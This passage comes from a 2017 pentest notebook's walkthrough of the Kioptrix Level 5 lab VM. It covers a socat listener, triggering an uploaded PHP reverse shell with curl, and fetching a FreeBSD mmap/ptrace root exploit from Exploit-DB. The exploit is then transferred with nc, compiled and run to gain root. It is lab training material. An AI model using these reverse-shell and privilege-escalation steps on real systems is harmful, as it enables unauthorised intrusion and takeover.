+<p><a class="reference external" href="https://www.exploit-db.com/search/?action=search&amp;e_author=&amp;platform=8&amp;type=2">Search the Exploit Database for FreeBSD local exploits</a> yields <a class="reference external" href="https://www.exploit-db.com/exploits/26368/">FreeBSD 9.0-9.1 mmap/ptrace - Privilege Escalation Exploit</a>. Let’s fire up the reverse shell and run the exploit. First on  a separate Kali terminal fire up a listener:</p>
+<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="nv">PT</span><span class="o">=</span><span class="nv">$HOME</span>/pentest/kioptrix5
+<span class="nb">source</span> <span class="nv">$PT</span>/kioptrix5_setup.sh
+<span class="nb">cd</span> <span class="nv">$PT</span>/exploit
+socat - TCP-LISTEN:<span class="nv">$PORT</span>
+</pre></div>
+</div>
+<p>Going back to your main Kali terminal fire up the reverse PHP shell uploaded previously:</p>
+<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="nv">PT</span><span class="o">=</span><span class="nv">$HOME</span>/pentest/kioptrix5
+<span class="nb">source</span> <span class="nv">$PT</span>/kioptrix5_setup.sh
+<span class="nb">cd</span> <span class="nv">$PT</span>/exploit
+<span class="nv">AGENT</span><span class="o">=</span><span class="s1">&#39;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0;)&#39;</span>
+<span class="nv">PHPTAX</span><span class="o">=</span><span class="s1">&#39;http://kioptrix5.com:8080/phptax&#39;</span>
+<span class="nv">REVSH</span><span class="o">=</span><span class="s2">&quot;revsh.php&quot;</span>
+<span class="nv">URL_REVSH</span><span class="o">=</span><span class="s2">&quot;</span><span class="nv">$PHPTAX</span><span class="s2">/data/</span><span class="nv">$REVSH</span><span class="s2">&quot;</span>
+curl --silent --user-agent <span class="s2">&quot;</span><span class="nv">$AGENT</span><span class="s2">&quot;</span> <span class="se">\</span>
+      <span class="nv">$URL_REVSH</span>
+</pre></div>
+</div>
+<p>Once the shell opens you can <code class="kbd docutils literal"><span class="pre">cntl-C</span></code> the <code class="docutils literal"><span class="pre">curl</span></code> command and continue on to obtain the exploit code and transfer it to the target host:</p>
+<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="nv">PT</span><span class="o">=</span><span class="nv">$HOME</span>/pentest/kioptrix5
+<span class="nb">source</span> <span class="nv">$PT</span>/kioptrix5_setup.sh
+<span class="nb">cd</span> <span class="nv">$PT</span>/exploit
+
+<span class="c1"># Download the exploit</span>
+<span class="nv">EXPLOIT</span><span class="o">=</span><span class="s1">&#39;exploit.c&#39;</span>
+curl --silent --insecure --output <span class="nv">$EXPLOIT</span> <span class="se">\</span>
+     https://www.exploit-db.com/download/26368
+dos2unix <span class="nv">$EXPLOIT</span>
+<span class="c1"># Upload to kioptrix5</span>
+socat FILE:<span class="nv">$EXPLOIT</span> TCP-LISTEN:<span class="nv">$PORT2</span>
+</pre></div>
+</div>
+<p>Back in the kioptrix5 reverse shell terminal change the following to have $KALI and $PORT2:</p>
+<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="c1"># Get a pty</span>
+/usr/local/bin/python -c <span class="s1">&#39;import pty; pty.spawn(&quot;/bin/sh&quot;)&#39;</span>
+<span class="c1"># Use nc to transfer exploit source to target</span>
+<span class="c1"># From the kioptrix5 side:</span>
+<span class="nb">cd</span> /tmp
+<span class="c1"># Fill in</span>
+nc KALI PORT2 &gt; exploit.c
+gcc -o exploit exploit.c
+./exploit
+id
+</pre></div>
+</div>
+<p>And so we have root.</p>
+</div>
+</div>
+</div>
+
+
+           </div>
+           <div class="articleComments">
+            
+           </div>
+          </div>
+          <footer>
+  
+    <div class="rst-footer-buttons" role="navigation" aria-label="footer navigation">
+      
+        <a href="kioptrix4.html" class="btn btn-neutral float-right" title="3.11. Kioptrix Level 4" accesskey="n" rel="next">Next <span class="fa fa-arrow-circle-right"></span></a>
+      
+      
+        <a href="underdist3.html" class="btn btn-neutral" title="3.9. Underdist: 3" accesskey="p" rel="prev"><span class="fa fa-arrow-circle-left"></span> Previous</a>
+      
+    </div>
+  
+
+  <hr/>
+
+  <div role="contentinfo">
+    <p>
+        &copy; Copyright 2017, bitbender.
+
+    </p>
+  </div>
+  Built with <a href="http://sphinx-doc.org/">Sphinx</a> using a <a href="https://github.com/snide/sphinx_rtd_theme">theme</a> provided by <a href="https://readthedocs.org">Read the Docs</a>. 
+
+</footer>
+
+        </div>
+      </div>
+
+    </section>
+
+  </div>
+  
+
+
+  
+
+    <script type="text/javascript">
+        var DOCUMENTATION_OPTIONS = {
+            URL_ROOT:'../',
+            VERSION:'1.0.2',
+            COLLAPSE_INDEX:false,
+            FILE_SUFFIX:'.html',
+            HAS_SOURCE:  true,
+            SOURCELINK_SUFFIX: '.txt'
+        };
+    </script>
+      <script type="text/javascript" src="../_static/jquery.js"></script>
+      <script type="text/javascript" src="../_static/underscore.js"></script>
+      <script type="text/javascript" src="../_static/doctools.js"></script>
+      <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.0/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+
+  
+
+  
+  
+    <script type="text/javascript" src="../_static/js/theme.js"></script>
+  
+
+  
+  
+  <script type="text/javascript">
+      jQuery(function () {
+          SphinxRtdTheme.StickyNav.enable();
+      });
+  </script>
+   
+
+</body>
+</html>
